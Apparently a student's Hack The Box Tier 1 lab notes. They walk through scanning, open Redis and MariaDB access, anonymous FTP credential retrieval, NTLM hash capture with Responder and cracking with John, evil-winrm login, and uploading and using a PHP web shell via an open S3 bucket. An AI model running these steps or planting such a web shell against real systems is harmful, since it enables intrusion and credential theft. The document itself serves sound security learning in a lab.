
# Hack The Box - Tier 1 Notes

---

## Redeemer

### Reconnaissance

- Used `nmap -sV <ip>` and didn’t get any results.
- Had to use:

```bash
nmap -p- -sV <ip>
```

- `-p-` scans **all** 65,535 ports instead of just the top 1000 — perfect for catching services that are "hiding."
- Found port `6379` running **Redis**:
  - Redis is an open-source in-memory data store used as a DB, cache, or message broker.
  - Connect using:

```bash
redis-cli -h <host> -p <port>
```

### Traversing the Database

- `select <index>` – switches to a specific database index
- `scan <index>` – lists keys in that index
- `get <filename>` – retrieves contents of a key (like a file)

---

## Sequel

### Reconnaissance

- Used `nmap -p- -sV <ip>` and found port `3306` running MySQL.
- Learned about `-sC` (script scan) — better at detecting versions.
- Discovered target is using **MariaDB**.

### Exploitation

- Used:

```bash
mariadb -u root -p
```

- But that connects locally only — needed:

```bash
mariadb -u root -p -h <host> --skip-ssl
```

- Once in:
  - `SHOW DATABASES;` — listed DBs
  - Found `htb`
  - `USE htb;`
  - `SHOW TABLES;` → Found `config`
  - `SELECT * FROM config;` → Dumped creds/config info

**Helpful resource:**  
https://www.dataquest.io/blog/sql-commands/

---

## Crocodile

### Reconnaissance

- Ran:

```bash
nmap -p- -sC -sV <ip>
```

- Found:
  - `21/tcp` (FTP — red flag)
  - `80/tcp` (HTTP)

### FTP Access

- Logged into FTP using anonymous login:

```bash
ftp <ip>
```

- Used `ls` to list files and `get` to download them
- Found `usernames.txt` and `passwords.txt`

### Web Enumeration

- Ran GoBuster in directory mode:

```bash
gobuster dir -u http://<ip> -w <wordlist>
```

- Discovered folders: `assets`, `css`, `dashboard`, `fonts`, `js`
- Navigated to `/dashboard/`
- Used FTP creds to log in via the web app

**Useful link:**  
https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/#dns-mode-options

---

## Responder

### Reconnaissance

- Nmap with `-p- -sC -sV` → found port `80` running PHP web app

### Vulnerability Insight

- PHP apps often vulnerable to **LFI/RFI** if they don’t validate `?page=` inputs
- If the app checks missing files over SMB, **NTLM authentication** can be triggered

### Exploiting via Responder

- Started Responder to impersonate SMB server:

```bash
responder -I tun0
```

- App sends NTLM hash to us thinking we’re the SMB server
- Captured hash → cracked with John the Ripper:

```bash
john -w /usr/share/wordlists/rockyou.txt hashfile
```

- Got:
  - Username: `administrator`
  - Password: `badminton`

### Access

- Used evil-winrm to get access:

```bash
evil-winrm -i <ip> -u administrator -p badminton
```

- Found and retrieved the flag

---

## Three

### Reconnaissance

- Scanned ports `22` and `80`
- Visited `http://<ip>` — saw a webpage mentioning domain `thetoppers.htb`
- Edited `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

- Added:

```
<ip> thetoppers.htb
```

---

### Web Enumeration w/ ffuf

Tool: `ffuf` — for bruteforcing directories and subdomains

```bash
ffuf -c -u http://thetoppers.htb -w <wordlist> -H "Host: FUZZ.thetoppers.htb" -mc 200,301,302
```

- Found subdomain: `s3.thetoppers.htb`
- Added that to `/etc/hosts` as well

---

### S3 Bucket Enumeration & Exploitation

- Learned about Amazon S3 and that it may allow anonymous access
- Used:

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb
```

- Created a PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

- Uploaded shell:

```bash
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

- Verified shell:

```
http://thetoppers.htb/shell.php?cmd=ls
```

- Read the flag:

```
http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
```

---
